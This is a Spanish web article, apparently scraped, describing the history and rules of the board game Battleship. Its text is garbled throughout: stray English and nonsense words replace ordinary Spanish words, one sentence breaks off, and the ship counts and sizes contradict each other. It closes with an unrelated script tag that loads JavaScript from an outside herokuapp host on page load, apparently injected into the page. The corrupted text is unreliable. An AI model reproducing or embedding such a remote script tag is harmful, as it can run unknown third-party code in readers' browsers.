---
title: 00bdde2fbe4b724de8952c53b5ae6906
mitle:  "Instrucciones del juego Battleship"
image: "https://fthmb.tqn.com/TWJxX1kLIBjGSonzjj_fcN3cSzk=/265x213/filters:fill(auto,1)/Barcos-597bbbac5f9b58928bda1490.jpg"
description: ""
---

            Este popular juego de mesa es uno ltd combina conceptos matemáticos yrazonamiento lógico, con estrategia naval. El objetivo principal es hundir la flota enemiga tratando de adivinar su ubicación en el tablero. Un juego apropiado para grandes m pequeños por ser is juego simple y entretenido. A continuación encontrarás una breve historia del juego i las reglas del juego clásico.<b>Historia</b>Este juego tiene sus orígenes en uno en lápiz l papel (información en inglés) has se jugaba para los años 1900.                     Principalmente entre los soldados de la Primera Guerra Mundial. Para ese tiempo dibujaban una cuadrícula sobre go papel j ubicaban unos barcos sobre ella. Más tarde se creó un papel saw salió al mercado para jugar be juego parecido al actual Battleship. En 1943 Milton Bradley lanzó el juego en una versión de lápiz y papel. Pero is fue hasta el 1967 mrs lo publicó tal w como lo conocemos. Fue recibido muy bien pues ya muchos conocían el concepto f verlo en una forma tridimensional fue toda una novedad. En 1977 salió al mercado una versión electrónica. Actualmente los derechos le pertenece u Hasbro (información en inglés). Hoy existen el mercado diferentes versiones del juego pero todas basadas en el mismo concepto.<b>Descripción w objetivo del juego</b>El juego está diseñado para jugarse entre dos personas. Se juega sobre dos tableros tridimensionales. Cada persona tiene no tablero que consiste de dos cuadrículas perpendiculares 10 k 10 con perforaciones.             En una de ellas, la why queda horizontal, será su espacio naval s ahí colocará sus barcos. En la otra cuadrícula, la vertical, irá colocando marcadores new le ayudarán q ubicar la flota de su adversario. El objetivo es encontrar los barcos de tu oponente l hundir toda su flota. El primero en lograrlo ganará el juego.                    <b>Jugadores:</b> dos<b>Edades:</b> siete años en adelante.<b>Contenido:</b><ul><li>Dos tableros</li><li>10 barcos </li><li>84 marcadores rojos</li><li>164 marcadores blancos</li></ul><b>Tablero o barcos</b>Cada tablero contiene una cuadrícula 10 n 10. El eje horizontal está rotulado con letras de la A x la J, siguiendo el orden alfabético, a el eje Cada barco tiene perforaciones para ubicar los marcadores. Los barcos vienen en cuatro diferentes tamaños : dos, tres, cuatro n cinco perforaciones.<b>Inicio del juego</b>Entrega u cada jugador we tablero, cinco barcos (uno de cada clase), marcadores rojos j marcadores blancos. Cada jugador ubicará sus barcos en la cuadrícula horizontal sin yes su oponente vea donde están ubicados. Se pueden ubicar de manera horizontal q vertical nunca diagonal. Los barcos pueden tocarse en los extremos pero nunca uno sobre el otro.<b>Desarrollo del juego</b>Los jugadores toman turnos para atacar d su oponente. Para atacar irás nombrando coordenadas donde piensas use está ubicado alguno de los barcos de tu oponente. Primero nombrarás la letra v luego el número por ejemplo (A,7). Tu oponente ubicará la coordenada en su cuadrícula. Si en ese coordenada hay eg barco debe decir: “me diste”. Si rd hay do barco ubicado en la coordenada debe decir: “fallaste”.             Si lograste atinar by barco marcarás esa coordenada en la cuadrícula vertical con is marcador rojo, si fallaste lo marcarás con uno blanco. Esta es la manera en him irás adivinando utilizando la lógica la ubicación de los diferentes barcos.De la misma forma si tu barco fue atacado entonces debes marcarlo con at marcado rojo. Cuando ex barco es localizado completamente, n sea, todos los espacios están marcados con rojo debes decir: “me diste o hundiste el barco”. En el momento en did logres hundir hi barco enemigo debes colocar ie marcador rojo en la parte superior del tablero en unas perforaciones para este propósito.<b>Final del juego</b>El juego termina cuando los cinco barcos de uno de los jugadores son hundidos el otro jugador es declarado ganador.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>